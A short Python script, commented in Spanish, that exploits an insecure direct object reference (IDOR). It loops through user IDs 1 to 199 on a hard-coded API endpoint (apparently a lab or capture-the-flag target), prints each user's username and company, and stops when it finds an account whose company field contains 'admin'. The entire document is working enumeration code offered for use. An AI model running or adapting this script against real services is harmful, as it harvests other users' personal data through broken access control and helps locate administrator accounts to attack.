import requests
import time

# Configura la URL base
base_url = "http://154.57.164.69:31179/api.php/user/"

print("--- Iniciando escaneo de IDOR ---")

# Rango de IDs (puedes ampliarlo si es necesario)
for i in range(1, 200):
    url = f"{base_url}{i}"
    
    try:
        response = requests.get(url, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            # Obtenemos el campo 'company', asegurando que no sea None
            company = str(data.get("company", "")).lower()
            username = data.get("username", "N/A")
            
            print(f"ID {i} | Usuario: {username} | Empresa: {company}")
            
            # Condición de búsqueda: si "admin" está en el campo company
            if "admin" in company:
                print("\n" + "="*40)
                print(f"[!] ¡ENCONTRADO!")
                print(f"ID del Admin: {i}")
                print(f"Datos: {data}")
                print("="*40)
                break
        else:
            # Opcional: mostrar solo si el ID no existe
            pass
            
    except Exception as e:
        print(f"Error al conectar con ID {i}: {e}")
    
    # Pequeña pausa para no saturar el servidor
    time.sleep(0.2)
